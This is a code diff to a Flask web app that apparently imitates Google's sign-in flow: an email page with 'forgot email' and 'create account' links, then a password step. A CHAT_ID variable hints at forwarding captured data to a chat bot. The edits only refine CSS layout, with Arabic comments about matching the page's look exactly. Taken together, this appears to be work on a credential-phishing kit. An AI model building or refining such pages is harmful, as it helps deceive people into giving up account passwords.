@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: بدون سحب نهائياً ومسافة ممتازة بين الروابط
+# الصفحة الأولى: دفع "إنشاء حساب" للعلامة الحمراء بدقة مع الحفاظ على ثبات الشاشة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -54,7 +54,7 @@ def step1():
             align-items: center; 
             justify-content: space-between;
             padding: 16px 20px;
-            overflow: hidden; /* لمنع أي سحب للشاشة نهائياً */
+            overflow: hidden;
         }
         
         .login-card {
@@ -111,11 +111,14 @@ def step1():
         .input-wrapper {
             width: 100%;
             text-align: right;
+            height: 130px; /* تحديد مساحة دقيقة لدفع رابط إنشاء حساب للعلامة الحمراء */
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
 
         .input-group { 
             width: 100%; 
-            margin-bottom: 6px; 
         }
         
         .input-group input {
@@ -135,14 +138,12 @@ def step1():
             text-decoration: none;
             font-weight: 500;
             display: inline-block;
-            margin-bottom: 16px; /* مسافة واضحة تحت هل نسيت بريدك */
         }
         .forgot-link:hover { text-decoration: underline; }
 
         .signup-container {
             width: 100%;
             text-align: right;
-            margin-top: 10px; /* مسافة كافية لتباعد إنشاء حساب عن هل نسيت بريدك */
         }
 
         .signup-link {
@@ -218,7 +219,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور
+# الصفحة الثانية تبقى كما هي بدون أي تغيير
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
